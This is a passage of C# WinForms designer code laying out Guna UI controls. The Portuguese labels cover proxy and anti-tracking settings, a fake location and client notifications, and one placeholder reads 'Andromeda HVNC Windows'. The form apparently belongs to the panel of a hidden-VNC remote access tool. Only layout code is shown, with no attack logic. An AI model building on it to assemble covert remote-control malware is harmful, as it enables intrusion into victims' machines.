            this.Guna2PictureBox48.Name = "Guna2PictureBox48";
            this.Guna2PictureBox48.Size = new System.Drawing.Size(30, 30);
            this.Guna2PictureBox48.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox48.TabIndex = 19;
            this.Guna2PictureBox48.TabStop = false;
            this.Guna2PictureBox48.UseTransparentBackground = true;
            // 
            // Guna2PictureBox58
            // 
            this.Guna2PictureBox58.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox58, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox58, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox58.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox58.Image")));
            this.Guna2PictureBox58.ImageRotate = 0F;
            this.Guna2PictureBox58.Location = new System.Drawing.Point(184, 679);
            this.Guna2PictureBox58.Name = "Guna2PictureBox58";
            this.Guna2PictureBox58.Size = new System.Drawing.Size(20, 20);
            this.Guna2PictureBox58.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox58.TabIndex = 111;
            this.Guna2PictureBox58.TabStop = false;
            this.Guna2PictureBox58.UseTransparentBackground = true;
            // 
            // Guna2HtmlLabel123
            // 
            this.Guna2HtmlLabel123.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel123, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel123, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel123.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel123.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel123.Location = new System.Drawing.Point(323, 450);
            this.Guna2HtmlLabel123.Name = "Guna2HtmlLabel123";
            this.Guna2HtmlLabel123.Size = new System.Drawing.Size(266, 19);
            this.Guna2HtmlLabel123.TabIndex = 67;
            this.Guna2HtmlLabel123.Text = "Configuração de proxy e anti-rastreamento";
            // 
            // guna2HtmlLabel51
            // 
            this.guna2HtmlLabel51.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel51, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel51, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel51.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel51.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel51.Location = new System.Drawing.Point(337, 57);
            this.guna2HtmlLabel51.Name = "guna2HtmlLabel51";
            this.guna2HtmlLabel51.Size = new System.Drawing.Size(245, 15);
            this.guna2HtmlLabel51.TabIndex = 85;
            this.guna2HtmlLabel51.Text = "Configure um local falso para não ser rastreado";
            // 
            // Guna2PictureBox57
            // 
            this.Guna2PictureBox57.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox57, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox57, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox57.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox57.Image")));
            this.Guna2PictureBox57.ImageRotate = 0F;
            this.Guna2PictureBox57.Location = new System.Drawing.Point(347, 674);
            this.Guna2PictureBox57.Name = "Guna2PictureBox57";
            this.Guna2PictureBox57.Size = new System.Drawing.Size(20, 20);
            this.Guna2PictureBox57.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox57.TabIndex = 110;
            this.Guna2PictureBox57.TabStop = false;
            this.Guna2PictureBox57.UseTransparentBackground = true;
            // 
            // Guna2PictureBox66
            // 
            this.Guna2PictureBox66.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox66, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox66, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox66.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox66.Image")));
            this.Guna2PictureBox66.ImageRotate = 0F;
            this.Guna2PictureBox66.Location = new System.Drawing.Point(657, 22);
            this.Guna2PictureBox66.Name = "Guna2PictureBox66";
            this.Guna2PictureBox66.Size = new System.Drawing.Size(30, 30);
            this.Guna2PictureBox66.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox66.TabIndex = 19;
            this.Guna2PictureBox66.TabStop = false;
            this.Guna2PictureBox66.UseTransparentBackground = true;
            // 
            // Guna2PictureBox56
            // 
            this.Guna2PictureBox56.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox56, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox56, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox56.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox56.Image")));
            this.Guna2PictureBox56.ImageRotate = 0F;
            this.Guna2PictureBox56.Location = new System.Drawing.Point(347, 648);
            this.Guna2PictureBox56.Name = "Guna2PictureBox56";
            this.Guna2PictureBox56.Size = new System.Drawing.Size(20, 20);
            this.Guna2PictureBox56.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox56.TabIndex = 109;
            this.Guna2PictureBox56.TabStop = false;
            this.Guna2PictureBox56.UseTransparentBackground = true;
            // 
            // Guna2TextBox6
            // 
            this.Guna2TextBox6.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Guna2TextBox6.BorderRadius = 3;
            this.Guna2TextBox6.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Guna2Transition1.SetDecoration(this.Guna2TextBox6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2TextBox6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2TextBox6.DefaultText = "5";
            this.Guna2TextBox6.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.Guna2TextBox6.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.Guna2TextBox6.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox6.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox6.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2TextBox6.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox6.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2TextBox6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox6.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox6.IconLeft = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox6.IconLeft")));
            this.Guna2TextBox6.Location = new System.Drawing.Point(323, 286);
            this.Guna2TextBox6.Name = "Guna2TextBox6";
            this.Guna2TextBox6.PasswordChar = '\0';
            this.Guna2TextBox6.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox6.PlaceholderText = "";
            this.Guna2TextBox6.SelectedText = "";
            this.Guna2TextBox6.Size = new System.Drawing.Size(213, 29);
            this.Guna2TextBox6.TabIndex = 97;
            // 
            // Guna2PictureBox55
            // 
            this.Guna2PictureBox55.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox55, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox55, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox55.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox55.Image")));
            this.Guna2PictureBox55.ImageRotate = 0F;
            this.Guna2PictureBox55.Location = new System.Drawing.Point(347, 617);
            this.Guna2PictureBox55.Name = "Guna2PictureBox55";
            this.Guna2PictureBox55.Size = new System.Drawing.Size(20, 20);
            this.Guna2PictureBox55.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox55.TabIndex = 108;
            this.Guna2PictureBox55.TabStop = false;
            this.Guna2PictureBox55.UseTransparentBackground = true;
            // 
            // Guna2HtmlLabel104
            // 
            this.Guna2HtmlLabel104.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel104, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel104, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel104.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel104.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel104.Location = new System.Drawing.Point(337, 22);
            this.Guna2HtmlLabel104.Name = "Guna2HtmlLabel104";
            this.Guna2HtmlLabel104.Size = new System.Drawing.Size(162, 19);
            this.Guna2HtmlLabel104.TabIndex = 67;
            this.Guna2HtmlLabel104.Text = "Localização de privacidade";
            // 
            // Guna2PictureBox54
            // 
            this.Guna2PictureBox54.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox54, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox54, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox54.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox54.Image")));
            this.Guna2PictureBox54.ImageRotate = 0F;
            this.Guna2PictureBox54.Location = new System.Drawing.Point(184, 653);
            this.Guna2PictureBox54.Name = "Guna2PictureBox54";
            this.Guna2PictureBox54.Size = new System.Drawing.Size(20, 20);
            this.Guna2PictureBox54.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox54.TabIndex = 107;
            this.Guna2PictureBox54.TabStop = false;
            this.Guna2PictureBox54.UseTransparentBackground = true;
            // 
            // Guna2TextBox4
            // 
            this.Guna2TextBox4.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Guna2TextBox4.BorderRadius = 3;
            this.Guna2TextBox4.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Guna2Transition1.SetDecoration(this.Guna2TextBox4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2TextBox4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2TextBox4.DefaultText = "";
            this.Guna2TextBox4.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.Guna2TextBox4.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.Guna2TextBox4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox4.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox4.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2TextBox4.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox4.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2TextBox4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox4.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox4.IconLeft = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox4.IconLeft")));
            this.Guna2TextBox4.Location = new System.Drawing.Point(323, 117);
            this.Guna2TextBox4.Name = "Guna2TextBox4";
            this.Guna2TextBox4.PasswordChar = '\0';
            this.Guna2TextBox4.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox4.PlaceholderText = "Andromeda HVNC Windows";
            this.Guna2TextBox4.SelectedText = "";
            this.Guna2TextBox4.Size = new System.Drawing.Size(364, 29);
            this.Guna2TextBox4.TabIndex = 93;
            // 
            // Guna2PictureBox53
            // 
            this.Guna2PictureBox53.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox53, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox53, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox53.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox53.Image")));
            this.Guna2PictureBox53.ImageRotate = 0F;
            this.Guna2PictureBox53.Location = new System.Drawing.Point(347, 591);
            this.Guna2PictureBox53.Name = "Guna2PictureBox53";
            this.Guna2PictureBox53.Size = new System.Drawing.Size(20, 20);
            this.Guna2PictureBox53.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox53.TabIndex = 106;
            this.Guna2PictureBox53.TabStop = false;
            this.Guna2PictureBox53.UseTransparentBackground = true;
            // 
            // Guna2TextBox5
            // 
            this.Guna2TextBox5.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Guna2TextBox5.BorderRadius = 3;
            this.Guna2TextBox5.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Guna2Transition1.SetDecoration(this.Guna2TextBox5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2TextBox5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2TextBox5.DefaultText = "";
            this.Guna2TextBox5.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.Guna2TextBox5.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.Guna2TextBox5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox5.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox5.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2TextBox5.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox5.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2TextBox5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox5.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox5.IconLeft = ((System.Drawing.Image)(resources.GetObject("Guna2TextBox5.IconLeft")));
            this.Guna2TextBox5.Location = new System.Drawing.Point(323, 180);
            this.Guna2TextBox5.Name = "Guna2TextBox5";
            this.Guna2TextBox5.PasswordChar = '\0';
            this.Guna2TextBox5.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox5.PlaceholderText = "United States";
            this.Guna2TextBox5.SelectedText = "";
            this.Guna2TextBox5.Size = new System.Drawing.Size(364, 29);
            this.Guna2TextBox5.TabIndex = 95;
            // 
            // Guna2PictureBox52
            // 
            this.Guna2PictureBox52.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox52, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox52, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox52.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox52.Image")));
            this.Guna2PictureBox52.ImageRotate = 0F;
            this.Guna2PictureBox52.Location = new System.Drawing.Point(184, 621);
            this.Guna2PictureBox52.Name = "Guna2PictureBox52";
            this.Guna2PictureBox52.Size = new System.Drawing.Size(20, 20);
            this.Guna2PictureBox52.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox52.TabIndex = 105;
            this.Guna2PictureBox52.TabStop = false;
            this.Guna2PictureBox52.UseTransparentBackground = true;
            // 
            // Guna2HtmlLabel112
            // 
            this.Guna2HtmlLabel112.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel112, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel112, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel112.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel112.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel112.Location = new System.Drawing.Point(323, 92);
            this.Guna2HtmlLabel112.Name = "Guna2HtmlLabel112";
            this.Guna2HtmlLabel112.Size = new System.Drawing.Size(114, 19);
            this.Guna2HtmlLabel112.TabIndex = 94;
            this.Guna2HtmlLabel112.Text = "Nome da conexão";
            // 
            // Guna2PictureBox50
            // 
            this.Guna2PictureBox50.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox50, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox50, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox50.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox50.Image")));
            this.Guna2PictureBox50.ImageRotate = 0F;
            this.Guna2PictureBox50.Location = new System.Drawing.Point(184, 595);
            this.Guna2PictureBox50.Name = "Guna2PictureBox50";
            this.Guna2PictureBox50.Size = new System.Drawing.Size(20, 20);
            this.Guna2PictureBox50.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox50.TabIndex = 104;
            this.Guna2PictureBox50.TabStop = false;
            this.Guna2PictureBox50.UseTransparentBackground = true;
            // 
            // Guna2CheckBox1
            // 
            this.Guna2CheckBox1.Animated = true;
            this.Guna2CheckBox1.AutoSize = true;
            this.Guna2CheckBox1.BackColor = System.Drawing.Color.Transparent;
            this.Guna2CheckBox1.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox1.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox1.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox1.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox1.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CheckBox1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox1.Location = new System.Drawing.Point(28, 596);
            this.Guna2CheckBox1.Name = "Guna2CheckBox1";
            this.Guna2CheckBox1.Size = new System.Drawing.Size(124, 19);
            this.Guna2CheckBox1.TabIndex = 94;
            this.Guna2CheckBox1.Text = "Notificação Client";
            this.Guna2CheckBox1.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox1.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox1.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox1.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox1.UseVisualStyleBackColor = false;
            // 
            // Guna2CheckBox3
            // 
            this.Guna2CheckBox3.Animated = true;
            this.Guna2CheckBox3.AutoSize = true;
            this.Guna2CheckBox3.BackColor = System.Drawing.Color.Transparent;
            this.Guna2CheckBox3.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox3.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox3.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox3.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox3.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CheckBox3.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox3.Location = new System.Drawing.Point(28, 623);
            this.Guna2CheckBox3.Name = "Guna2CheckBox3";
            this.Guna2CheckBox3.Size = new System.Drawing.Size(155, 19);
            this.Guna2CheckBox3.TabIndex = 95;
            this.Guna2CheckBox3.Text = "Atualização Notificação";
            this.Guna2CheckBox3.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox3.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox3.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox3.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox3.UseVisualStyleBackColor = false;
            // 
            // Guna2CheckBox11
            // 
            this.Guna2CheckBox11.Animated = true;
            this.Guna2CheckBox11.AutoSize = true;
            this.Guna2CheckBox11.BackColor = System.Drawing.Color.Transparent;
            this.Guna2CheckBox11.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox11.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox11.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox11.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox11.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox11, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox11, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CheckBox11.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox11.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox11.Location = new System.Drawing.Point(214, 702);
            this.Guna2CheckBox11.Name = "Guna2CheckBox11";
            this.Guna2CheckBox11.Size = new System.Drawing.Size(130, 19);
            this.Guna2CheckBox11.TabIndex = 103;
            this.Guna2CheckBox11.Text = "Mostrar Proxy/SSL";
            this.Guna2CheckBox11.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox11.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox11.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox11.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox11.UseVisualStyleBackColor = false;
            // 
            // Guna2CheckBox4
            // 
            this.Guna2CheckBox4.Animated = true;
            this.Guna2CheckBox4.AutoSize = true;
            this.Guna2CheckBox4.BackColor = System.Drawing.Color.Transparent;
            this.Guna2CheckBox4.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox4.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox4.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox4.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox4.CheckMarkColor = System.Drawing.Color.FromArgb(((int)(((byte)(16)))), ((int)(((byte)(10)))), ((int)(((byte)(53)))));
            this.Guna2Transition1.SetDecoration(this.Guna2CheckBox4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CheckBox4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CheckBox4.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.Guna2CheckBox4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2CheckBox4.Location = new System.Drawing.Point(214, 596);
            this.Guna2CheckBox4.Name = "Guna2CheckBox4";
            this.Guna2CheckBox4.Size = new System.Drawing.Size(132, 19);
            this.Guna2CheckBox4.TabIndex = 96;
            this.Guna2CheckBox4.Text = "Mostrar localização";
            this.Guna2CheckBox4.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox4.UncheckedState.BorderRadius = 3;
            this.Guna2CheckBox4.UncheckedState.BorderThickness = 0;
            this.Guna2CheckBox4.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.Guna2CheckBox4.UseVisualStyleBackColor = false;
            // 
            // Guna2CheckBox10
            // 
            this.Guna2CheckBox10.Animated = true;
            this.Guna2CheckBox10.AutoSize = true;
            this.Guna2CheckBox10.BackColor = System.Drawing.Color.Transparent;
            this.Guna2CheckBox10.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2CheckBox10.CheckedState.BorderRadius = 3;
            this.Guna2CheckBox10.CheckedState.BorderThickness = 0;
            this.Guna2CheckBox10.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
